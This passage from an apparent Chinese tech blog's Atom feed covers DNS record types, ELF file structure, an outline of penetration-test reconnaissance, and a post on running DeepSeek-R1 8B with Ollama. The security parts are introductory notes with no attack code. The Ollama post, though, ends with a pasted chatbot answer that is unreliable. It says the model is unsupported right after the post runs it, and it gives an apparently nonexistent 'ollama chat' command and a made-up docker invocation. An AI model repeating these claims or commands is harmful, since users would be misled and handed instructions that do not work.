title="记录类型"></a>记录类型</h4><p>A记录：是最常用类型，将域名指向一个IPv4地址，如8.8.8.8<br>CNAME：别名记录，将域名指向另一个域名地址，与其保持相同解析(如z.cn跳转到amazon.cn)</p><p>MX：用于邮件服务器，相关参数一般由邮件注册商提供，企业邮箱服务(如腾讯企业邮mxdomain.qq.com）</p><p>TXT：可填写附加文本信息，常用于域名验证<br>NS(name serve)：域名服务器记录，可将指定域名交由其他DNS服务商解析管理(如f1g1ns1.dnspod.net)</p><p>AAAA：将域名指向一个IPv6地址(如ff06:0:0:0:0:0:0:c3)</p><p><a href="https://www.strerr.com/cn/nslookup.html">DNS域名在线查询 - www.strerr.com</a></p><p><a href="https://sitereport.netcraft.com/">该网站正在运行什么？|网络工艺</a></p><p><a href="http://www.jsons.cn/nslookup/">在线域名解析记录检测-在线Nslookup域名解析查询工具</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-域名是什么&quot;&gt;&lt;a href=&quot;#1-域名是什么&quot; class=&quot;headerlink&quot; title=&quot;1.域名是什么?&quot;&gt;&lt;/a&gt;1.域名是什么?&lt;/h1&gt;&lt;p&gt;用来代替IP，找到网络上的一台计算机&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/./../../../</summary>
      
    
    
    
    <category term="Penetration Test" scheme="https://rhea006.github.io/categories/Penetration-Test/"/>
    
    <category term="信息收集" scheme="https://rhea006.github.io/categories/Penetration-Test/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
    
    <category term="渗透测试" scheme="https://rhea006.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>ELF文件格式</title>
    <link href="https://rhea006.github.io/2025/06/d6d094e5785a.html"/>
    <id>https://rhea006.github.io/2025/06/d6d094e5785a.html</id>
    <published>2025-06-28T12:16:36.000Z</published>
    <updated>2025-07-01T03:47:19.907Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ELF文件类型"><a href="#ELF文件类型" class="headerlink" title="ELF文件类型"></a>ELF文件类型</h1><p>1.可执行文件（Executable File）[.exec]:经过链接的、可执行的目标文件，通常也称为程序。</p><p>2.可重定位文件（Relocatable File）（可重定位目标文件）[.rel]:由源代码编译生成，包含编译后的二进制代码和数据，但未完成链接过程，通常以”.o”作为扩展名。</p><p>3.共享目标文件（Shared Object file）[.dyn]:动态链接库文件。可被多个程序共享使用，在运行时加载到内存。</p><h1 id="ELF-文件结构"><a href="#ELF-文件结构" class="headerlink" title="ELF 文件结构"></a>ELF 文件结构</h1><p>ELF 文件通过特定的格式组织数据，主要结构包括：</p><h4 id="1-ELF-文件头（ELF-Header）"><a href="#1-ELF-文件头（ELF-Header）" class="headerlink" title="1. ELF 文件头（ELF Header）"></a><strong>1. ELF 文件头（ELF Header）</strong></h4><ul><li>位于文件起始位置，描述文件的基本属性。</li><li>关键字段：<ul><li><strong>EI_MAGIC</strong>：文件魔数（如<code>0x7F ELF</code>），用于标识 ELF 格式。[7f 45 4c 46即字符串“\177ELF“]</li><li><strong>EI_CLASS</strong>：位数（32 位或 64 位）。</li><li><strong>EI_DATA</strong>：字节序（大端或小端）。</li><li><strong>e_type</strong>：文件类型（可执行文件、共享库等）。</li><li><strong>e_entry</strong>：程序入口地址。</li></ul></li></ul><h4 id="2-程序头表-段表（Program-Header-Table）"><a href="#2-程序头表-段表（Program-Header-Table）" class="headerlink" title="2. 程序头表&#x2F;段表（Program Header Table）"></a><strong>2. 程序头表&#x2F;段表（Program Header Table）</strong></h4><ul><li>描述文件在内存中的布局，用于加载器将文件映射到内存。</li><li>关键字段：<ul><li><strong>p_type</strong>：段类型（如代码段、数据段、动态链接段）。</li><li><strong>p_vaddr</strong>：内存虚拟地址。</li><li><strong>p_filesz</strong>：文件中占用的大小。</li><li><strong>p_memsz</strong>：内存中占用的大小。</li></ul></li></ul><h4 id="3-节头表（Section-Header-Table）"><a href="#3-节头表（Section-Header-Table）" class="headerlink" title="3. 节头表（Section Header Table）"></a><strong>3. 节头表（Section Header Table）</strong></h4><ul><li>描述文件中的各个 “节”（Section），用于链接器处理目标文件。</li><li>常见节类型：<ul><li><strong>.text</strong>：可执行代码段。</li><li><strong>.data</strong>：已初始化的全局变量和静态变量。</li><li><strong>.bss</strong>：未初始化的全局变量和静态变量（运行时自动初始化为 0）。</li><li><strong>.rodata</strong>：只读数据段（如字符串常量）。</li><li><strong>.symtab</strong>：符号表，记录函数和变量的名称、地址等。</li><li><strong>.strtab</strong>：字符串表，存储符号表中的字符串内容。</li></ul></li></ul><h4 id="4-节（Sections）"><a href="#4-节（Sections）" class="headerlink" title="4. 节（Sections）"></a><strong>4. 节（Sections）</strong></h4><ul><li>具体存储代码、数据、元信息的区域，不同类型的 ELF 文件包含的节不同。</li><li>示例：<ul><li>可执行文件：包含<code>.text</code>、<code>.data</code>、<code>.dynamic</code>（动态链接信息）等。</li><li>目标文件：包含<code>.text</code>、<code>.rel.text</code>（代码重定位信息）等。</li></ul></li></ul><p><img src="/./../../../../../images/image-20250629223418086.png" alt="image-20250629223418086"></p><p><img src="/./../../../../../images/image-20250629223515561.png" alt="image-20250629223515561"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ELF文件类型&quot;&gt;&lt;a href=&quot;#ELF文件类型&quot; class=&quot;headerlink&quot; title=&quot;ELF文件类型&quot;&gt;&lt;/a&gt;ELF文件类型&lt;/h1&gt;&lt;p&gt;1.可执行文件（Executable File）[.exec]:经过链接的、可执行的目标文件，通常也</summary>
      
    
    
    
    <category term="PWN" scheme="https://rhea006.github.io/categories/PWN/"/>
    
    <category term="Learning" scheme="https://rhea006.github.io/categories/PWN/Learning/"/>
    
    <category term="1-二进制文件" scheme="https://rhea006.github.io/categories/PWN/Learning/1-%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6/"/>
    
    <category term="2-ELF文件格式" scheme="https://rhea006.github.io/categories/PWN/Learning/1-%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6/2-ELF%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/"/>
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://rhea006.github.io/2025/06/a0cca283eeaf.html"/>
    <id>https://rhea006.github.io/2025/06/a0cca283eeaf.html</id>
    <published>2025-06-28T07:09:15.147Z</published>
    <updated>2025-06-30T04:13:35.565Z</updated>
    
    <content type="html"><![CDATA[<p>title: 信息收集概览<br>date: 2025-06-28 20:16:36<br>categories:<br>tags: -渗透测试</p><h1 id="渗透测试的流程"><a href="#渗透测试的流程" class="headerlink" title="渗透测试的流程"></a>渗透测试的流程</h1><h2 id="确定目标"><a href="#确定目标" class="headerlink" title="确定目标"></a>确定目标</h2><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h2 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h2><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h2 id="形成报告"><a href="#形成报告" class="headerlink" title="形成报告"></a>形成报告</h2><h3 id="信息收集包括内容"><a href="#信息收集包括内容" class="headerlink" title="信息收集包括内容"></a>信息收集包括内容</h3><h3 id="收集范围："><a href="#收集范围：" class="headerlink" title="收集范围："></a>收集范围：</h3><p>域名信息、IP段、开放的端口、网站架构、文件目录结构、软件版本、WAF、旁站、C段…</p><h4 id="分类："><a href="#分类：" class="headerlink" title="分类："></a>分类：</h4><p>1.域名相关信息</p><p>2.IP相关信息</p><p>3.端口服务相关信息</p><p>4.指纹识别（CMS&#x2F;CDF&#x2F;WAF）</p><p>5.Google Hacking</p><p>6.目录信息</p><p>7.Git Hack</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;title: 信息收集概览&lt;br&gt;date: 2025-06-28 20:16:36&lt;br&gt;categories:&lt;br&gt;tags: -渗透测试&lt;/p&gt;
&lt;h1 id=&quot;渗透测试的流程&quot;&gt;&lt;a href=&quot;#渗透测试的流程&quot; class=&quot;headerlink&quot; title</summary>
      
    
    
    
    <category term="Penetration Test" scheme="https://rhea006.github.io/categories/Penetration-Test/"/>
    
    <category term="信息收集" scheme="https://rhea006.github.io/categories/Penetration-Test/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
    
  </entry>
  
  <entry>
    <title>r1_8b</title>
    <link href="https://rhea006.github.io/2025/06/38d795f72413.html"/>
    <id>https://rhea006.github.io/2025/06/38d795f72413.html</id>
    <published>2025-06-17T14:00:00.000Z</published>
    <updated>2025-06-18T06:49:07.645Z</updated>
    
    <content type="html"><![CDATA[<p>系统变量，对系统的所有账户生效，您可以根据情况自己选。点击添加添加，输入变量名OLLAMA_MODELS，变量值输入您放置ollama模型的新地址，我这里放在了E:\ollama\models</p><p><img src="/images/254E7FA0-46F1-4144-B913-C7C3E82AFEBA.png"></p><p><img src="/images/E5D4D6BF-5C2F-450B-BF73-B2076752FB89.png"></p><ol><li>拉取模型</li></ol><blockquote><p>ollama pull deepseek-r1:8b</p></blockquote><ol start="2"><li>运行模型</li></ol><blockquote><p>ollama run deepseek-r1:8b</p></blockquote><h3 id="🔍-Can-I-run-DeepSeek-R1-8B-via-Ollama"><a href="#🔍-Can-I-run-DeepSeek-R1-8B-via-Ollama" class="headerlink" title="🔍 Can I run DeepSeek-R1:8B via Ollama?"></a>🔍 Can I run DeepSeek-R1:8B via Ollama?</h3><p>Currently, <strong>Ollama does not officially support the DeepSeek-R1 8B model</strong> unless it has been added to their<br>repository or community-supported list. You should check:</p><ul><li>The <a href="https://ollama.com/models">Ollama models page</a> for updates.</li><li>Community forums (e.g., GitHub issues) if users have shared custom Docker images&#x2F;definitions.</li></ul><hr><h3 id="🧪-How-to-run-transformer-models-like-DeepSeek-R1-via-Ollama"><a href="#🧪-How-to-run-transformer-models-like-DeepSeek-R1-via-Ollama" class="headerlink" title="🧪 How to run transformer models like DeepSeek-R1 via Ollama"></a>🧪 How to run transformer models like DeepSeek-R1 via Ollama</h3><p>If the model is supported, you can use this command:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ollama run deepseek-r1:8b</span><br></pre></td></tr></table></figure><p>This will:</p><ul><li>Download (if not installed) and load the 8B parameter version of DeepSeek-R1.</li><li>Start a local instance for interactive chat or API access.</li></ul><hr><h3 id="🤔-What-is-DeepSeek-R1-8B"><a href="#🤔-What-is-DeepSeek-R1-8B" class="headerlink" title="🤔 What is DeepSeek-R1:8B?"></a>🤔 What is DeepSeek-R1:8B?</h3><p>DeepSeek-R1 is an advanced transformer language model developed by <a href="https://www.deepseek.com/">深度求索（DeepSeek）</a>. The “8B” refers to <strong>8 billion parameters</strong> in the model. It’s designed for:</p><ul><li>Natural language understanding and generation.</li><li>Code-related tasks (syntax, debugging).</li><li>Knowledge answering.</li><li>Creative writing.</li></ul><hr><h3 id="📄-Example-usage-with-Ollama-CLI"><a href="#📄-Example-usage-with-Ollama-CLI" class="headerlink" title="📄 Example usage with Ollama CLI"></a>📄 Example usage with Ollama CLI</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Start interactive chat (if supported)</span></span><br><span class="line">ollama chat deepseek-r1:8b</span><br><span class="line"></span><br><span class="line"><span class="comment"># Or generate text via API/command line:</span></span><br><span class="line">curl http://localhost:11434/api/generate \</span><br><span class="line">  -X POST \</span><br><span class="line">  -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">  -d <span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">    &quot;model&quot;: &quot;deepseek-r1:8b&quot;,</span></span><br><span class="line"><span class="string">    &quot;prompt&quot;: &quot;Explain quantum computing in simple terms.&quot;,</span></span><br><span class="line"><span class="string">    &quot;stream&quot;: false</span></span><br><span class="line"><span class="string">  &#125;&#x27;</span></span><br></pre></td></tr></table></figure><hr><h3 id="⚠️-If-the-model-isn’t-supported-yet"><a href="#⚠️-If-the-model-isn’t-supported-yet" class="headerlink" title="⚠️ If the model isn’t supported yet:"></a>⚠️ If the model isn’t supported yet:</h3><p>You can try running it via Docker (if you have technical access):</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --name deepseek-r1 \</span><br><span class="line">  -p 11434:11434 \</span><br><span class="line">  --<span class="built_in">rm</span> \</span><br><span class="line">  -v ollama_models:/models \</span><br><span class="line">  llamafile/docker-ollama \</span><br><span class="line">  predict DeepSeek-R1 /models/deepseek-r1.tar</span><br></pre></td></tr></table></figure><p>But note: This may not be officially maintained.</p><hr><h3 id="🌟-What-else-can-Ollama-run"><a href="#🌟-What-else-can-Ollama-run" class="headerlink" title="🌟 What else can Ollama run?"></a>🌟 What else can Ollama run?</h3><p>Oll (a) supports models like:</p><ul><li>Llama, Mistral, Mixtral</li><li>GPT models (via LMSYS)</li><li>Gemma, Phi, CodeLlama</li><li>And many others!</li></ul><p>Check the <a href="https://ollama.com/models">current list on their website</a>.</p><hr><p>Let me know if you’d like help with a specific task using DeepSeek-R1 or another model! 😊</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;系统变量，对系统的所有账户生效，您可以根据情况自己选。点击添加添加，输入变量名OLLAMA_MODELS，变量值输入您放置ollama模型的新地址，我这里放在了E:&#92;ollama&#92;models&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/254E7FA0-46F1-4</summary>
      
    
    
    
    <category term="Deepseek" scheme="https://rhea006.github.io/categories/Deepseek/"/>
    
    
  </entry>
  
</feed>
